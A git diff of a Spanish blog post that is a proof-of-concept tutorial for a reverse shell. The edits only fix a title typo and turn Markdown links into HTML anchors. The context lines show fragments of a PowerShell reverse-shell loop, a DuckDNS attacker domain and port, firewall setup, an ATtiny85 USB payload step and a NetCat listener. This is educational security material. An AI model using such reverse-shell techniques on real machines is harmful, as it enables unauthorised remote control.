@@ -1,7 +1,7 @@
 ---
 author: Inge Gatovsky
 pubDatetime: 2024-10-15T07:15:46.746Z
-title: Pruena de Concepto Reverse Shell
+title: Prueba de Concepto Reverse Shell
 slug: prueba-de-concepto-reverse-shell
 featured: true
 draft: false
@@ -24,7 +24,8 @@ El objetivo de esta prueba de concepto es obtener una shell inversa en un sistem
 
 ### Configuración del servidor 🖥️
 
-Usamos la misma configuración de la [Tarea 998, Configuración del servidor remoto](tarea-998.md#configuración-del-servidor-remoto), solo que ahora activamos otro puerto en el firewall de Ubuntu:
+<a href="">Tarea 998, Configuración del servidor remoto</a>
+Usamos la misma configuración de la <a href="https://blog.hharieta.lat/posts/tarea-998-prueba-de-concepto/#configuración-del-servidor-remoto" target="_blank">Tarea 998, Configuración del servidor remoto</a>, solo que ahora activamos otro puerto en el firewall de Ubuntu:
 
 ```bash
 sudo ufw allow 8181
@@ -52,7 +53,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $client.Close();
 ```
 
-donde `dominio.duckdns.org` es el dominio que se creó en [DuckDNS](https://www.duckdns.org/), y `8080` es el puerto que está escuchando en el servidor remoto
+donde `dominio.duckdns.org` es el dominio que se creó en <a href="https://www.duckdns.org/" target="_blank">DuckDNS</a>, y `8080` es el puerto que está escuchando en el servidor remoto
 
 **instala** `screen` en el servidor con el comando:
 
@@ -117,9 +118,9 @@ void loop() {}
 
 ```
 
-_donde `dominio.duckdns.org` es el dominio que se creó en [DuckDNS](https://www.duckdns.org/)_
+_donde `dominio.duckdns.org` es el dominio que se creó en <a href="https://www.duckdns.org/" target="_blank">DuckDNS</a>_
 
-El código ino lo debes cargar al Attiny85 similar a como se muestra [aquí](tarea-998.md#configuración-de-arduino-ide-2x)
+El código ino lo debes cargar al Attiny85 similar a como se muestra<a href="https://blog.hharieta.lat/posts/tarea-998-prueba-de-concepto/#configuración-de-arduino-ide-2x" target="_blank">aquí</a>
 
 ### Configuración de NetCat 🐱
 
